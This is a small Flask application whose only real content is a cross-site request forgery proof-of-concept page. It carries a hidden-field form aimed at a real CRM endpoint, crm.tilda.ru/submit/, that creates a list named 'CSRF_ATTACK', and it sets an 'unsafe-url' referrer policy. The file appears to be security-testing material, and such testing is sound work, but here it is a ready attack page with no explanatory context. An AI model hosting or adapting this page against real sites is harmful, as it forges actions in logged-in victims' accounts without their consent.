from flask import Flask, make_response

app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello from Flask!'

@app.route('/csrf.html')
def csrf_page():
    html = '''
    <html>
    <head>
    <title>CSRF</title>
    <meta name="referrer" content="unsafe-url">
    <body>
        <form action="https://crm.tilda.ru/submit/" method="POST">
            <input type="hidden" name="lang" value="RU" />
            <input type="hidden" name="list&#91;name&#93;" value="CSRF_ATTACK" />
            <input type="hidden" name="action" value="list" />
            <input type="submit" value="Submit request" />
        </form>
        <script>


        </script>
    </body>
</html>
    '''
    response = make_response(html)
    response.headers['Referrer-Policy'] = 'unsafe-url'
    return response
